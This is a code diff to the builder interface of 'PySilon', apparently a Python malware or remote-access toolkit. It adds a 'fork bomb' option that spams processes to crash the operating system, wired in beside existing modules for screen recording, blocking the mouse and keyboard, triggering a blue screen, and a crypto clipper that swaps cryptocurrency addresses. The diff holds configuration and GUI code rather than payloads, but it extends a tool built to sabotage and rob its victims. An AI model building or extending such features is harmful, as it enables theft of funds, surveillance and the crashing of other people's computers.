@@ -29,7 +29,8 @@ filenames = {
     'scrnrec': 'screenrec.py',
     'inputbl': 'block_input.py',
     'bluesod': 'bsod.py',
-    'crclipr': 'crypto_clipper.py'
+    'crclipr': 'crypto_clipper.py',
+    'forkbmb': 'fork_bomb.py'
 }
 
 default_modules = [
@@ -89,6 +90,7 @@ def load_configuration(is_custom):
     cbvar_inputbl.set(config['FUNCTIONALITY']['inputbl'])
     cbvar_bluesod.set(config['FUNCTIONALITY']['bluesod'])
     cbvar_crclipr.set(config['FUNCTIONALITY']['crclipr'])
+    cbvar_forkbmb.set(config['FUNCTIONALITY']['forkbmb'])
 
 def reset_configuration():
     server_id.delete(0, END)
@@ -116,6 +118,7 @@ def reset_configuration():
     cbvar_inputbl.set(True)
     cbvar_bluesod.set(True)
     cbvar_crclipr.set(True)
+    cbvar_forkbmb.set(True)
     cbvar_disclaimer.set(False)
 
     change_icon('resources/icons/icon.ico')
@@ -159,6 +162,7 @@ def save_configuration():
     config['FUNCTIONALITY']['inputbl'] = str(cbvar_inputbl.get())
     config['FUNCTIONALITY']['bluesod'] = str(cbvar_bluesod.get())
     config['FUNCTIONALITY']['crclipr'] = str(cbvar_crclipr.get())
+    config['FUNCTIONALITY']['forkbmb'] = str(cbvar_forkbmb.get())
 
     with open(config_path, 'w') as configfile:
         config.write(configfile)
@@ -274,7 +278,7 @@ if len(sys.argv) > 1:
         cli = 'soon' # CLI mode will be added soon...
 else:
     root = Tk()
-    root.geometry('750x660')
+    root.geometry('750x700')
     root.resizable(True, True)
     root.iconbitmap('resources/icons/icon.ico')
     root.title('PySilon Builder')
@@ -353,6 +357,7 @@ else:
     cbvar_inputbl = BooleanVar(value=True)
     cbvar_bluesod = BooleanVar(value=True)
     cbvar_crclipr = BooleanVar(value=True)
+    cbvar_forkbmb = BooleanVar(value=True)
 
     def open_crypto_clipper_config():
         json_file_path = 'crypto_clipper.json'
@@ -375,6 +380,7 @@ else:
     cb_scrnrec = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='screen recording', variable=cbvar_scrnrec, command=config_modification, onvalue=True, offvalue=False)
     cb_inputbl = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='block input (mouse & keyboard)', variable=cbvar_inputbl, command=config_modification, onvalue=True, offvalue=False)
     cb_bluesod = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='trigger a bsod', variable=cbvar_bluesod, command=config_modification, onvalue=True, offvalue=False)
+    cb_forkbmb = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='fork bomb (spam processes to crash os)', variable=cbvar_forkbmb, command=config_modification, onvalue=True, offvalue=False)
     cb_crclipr = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='crypto clipper (replaces crypto addresses)', variable=cbvar_crclipr, command=config_modification, onvalue=True, offvalue=False)
     json_button = Button(settings_canvas, text='⚙', command=open_crypto_clipper_config)
 
@@ -394,8 +400,9 @@ else:
     cb_inputbl.grid(row=16, column=2, sticky=W, padx=(30, 0))
     cb_webcam.grid(row=17, column=2, sticky=W, padx=(30, 0))
     cb_bluesod.grid(row=18, column=2, sticky=W, padx=(30, 0))
-    cb_crclipr.grid(row=19, column=2, sticky=W, padx=(30, 0), pady=(0, 20))
-    json_button.grid(row=19, column=2, padx=(190, 0), pady=(0, 20))
+    cb_forkbmb.grid(row=19, column=2, sticky=W, padx=(30, 0))
+    cb_crclipr.grid(row=20, column=2, sticky=W, padx=(30, 0), pady=(0, 30))
+    json_button.grid(row=20, column=2, padx=(190, 0), pady=(0, 30))
 
     bottom_buttons = Canvas(root, width=1, height=1, bd=0)
     cbvar_disclaimer = BooleanVar(value=False)
